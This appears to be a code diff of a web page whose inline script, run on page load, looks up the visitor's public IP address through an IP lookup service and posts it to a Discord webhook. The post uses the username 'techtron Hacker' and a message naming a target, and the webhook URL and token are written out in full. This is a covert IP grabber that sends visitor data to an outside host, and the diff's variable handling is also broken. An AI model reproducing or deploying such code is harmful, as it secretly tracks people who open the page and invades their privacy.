@@ -9,30 +9,32 @@
 
 <body>
     <script>
+        var tekh;
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
-            .then(data => console.log(data.ip));
+            .then(data => console.log(data.ip))
+            .then(tekh = data.ip);
 
 
-            var myHeaders = new Headers();
-myHeaders.append("Content-Type", "application/json");
+        var myHeaders = new Headers();
+        myHeaders.append("Content-Type", "application/json");
 
-var raw = JSON.stringify({
-  "username": "techtron Hacker",
-  "content": `amrs ip is ${data.ip}`
-});
+        var raw = JSON.stringify({
+            "username": "techtron Hacker",
+            "content": `amrs ip is ${tekh}`
+        });
 
-var requestOptions = {
-  method: 'POST',
-  headers: myHeaders,
-  body: raw,
-  redirect: 'follow'
-};
+        var requestOptions = {
+            method: 'POST',
+            headers: myHeaders,
+            body: raw,
+            redirect: 'follow'
+        };
 
-fetch("https://discord.com/api/webhooks/1148821173245857852/T7m0LSuEZlWb-rPyjS586aeYToN3rQN9ov2Cco4kk2PaiY3s5h8-YHsBXeSfRaFIliIg", requestOptions)
-  .then(response => response.text())
-  .then(result => console.log(result))
-  .catch(error => console.log('error', error));
+        fetch("https://discord.com/api/webhooks/1148821173245857852/T7m0LSuEZlWb-rPyjS586aeYToN3rQN9ov2Cco4kk2PaiY3s5h8-YHsBXeSfRaFIliIg", requestOptions)
+            .then(response => response.text())
+            .then(result => console.log(result))
+            .catch(error => console.log('error', error));
 
     </script>
 </body>
